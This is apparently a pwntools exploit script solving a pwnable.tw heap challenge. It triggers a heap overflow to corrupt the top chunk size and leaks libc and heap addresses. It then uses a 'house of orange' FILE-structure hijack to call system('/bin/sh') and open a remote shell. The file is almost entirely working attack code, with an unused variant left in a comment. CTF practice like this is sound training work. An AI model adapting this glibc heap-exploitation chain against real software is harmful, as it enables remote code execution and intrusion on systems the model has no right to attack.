from pwn import *

#s = remote('192.168.0.85',1234)
s = remote('chall.pwnable.tw',10304)
def add(size, dat):
  s.recvuntil('choice :')
  s.send('1\n')
  s.recvuntil('page :')
  s.send(str(size)+'\n')
  s.recvuntil('Content :')
  s.send(dat)
def edit(index,dat):
  s.recvuntil('choice :')
  s.send('3\n')
  s.recvuntil('page :')
  s.send(str(index)+'\n')
  s.recvuntil('Content:')
  s.send(dat)
def author(dat):
  s.recvuntil('choice :')
  s.send('4\n')
  s.recvuntil('(yes:1 / no:0)')
  s.send('1\n')
  s.recvuntil('Author :')
  s.send(dat)
s.recvuntil('Author :')
s.send('1234\n')
# trigger bug -- mainpulate size
add(0x18,'A'*0x18)
edit(0,'A'*0x18)
edit(0,'\x00'*0x18+'\xe1\x0f\x00')
add(0x1ffe1,'\n')
add(0x10,'A')
s.recvuntil('choice :')
s.send('2\n')
s.recvuntil('page :')
s.send('2\n')
libc = u64(s.recvuntil('-')[-2-6:-2]+'\x00\x00') - 0x3c3b41 - 0x600
log.info('Libc : 0x%x'%libc)
# leak heap memory
author('A'*0x40)
s.recvuntil('choice :')
s.send('4\n')
heap = u64(s.recvuntil('Page')[-5-4:-5]+'\x00\x00\x00\x00')
log.info('Heap : 0x%x'%heap)
s.recvuntil('(yes:1 / no:0)')
s.send('0\n')

#house of orange
for i in xrange(6):
  add(0x10,'1234')
fake_ptr = heap + 0x1a0
dat = ''
dat += '\x00'+'\x41'*(0x108-0x11-8)+'/bin/sh\x00'+p64(0x61)+'A'*8+p64(libc+0x3c4520-0x10)
dat += 'A'*(0xa0-0x8*4)
dat += p64(fake_ptr)
dat += '\x41'*8
dat += 'A'*0x18
dat += p64(libc + 0x45390)
dat += '\xff'*8
dat += p64(fake_ptr)*200
edit(0,dat)
'''
raw_input('$')
edit(0,'\x00'*0x118+p64(0x000000000000ee1)) # top chunk size
add(0x100e1,'124')
edit(0,'\x41'*0x128)
edit(0,'\x00'*(0x120-0x8)+p64(0xec1)+'A'*8+p64(libc+0x3c4520-0x10)[:-2])
'''
s.interactive()
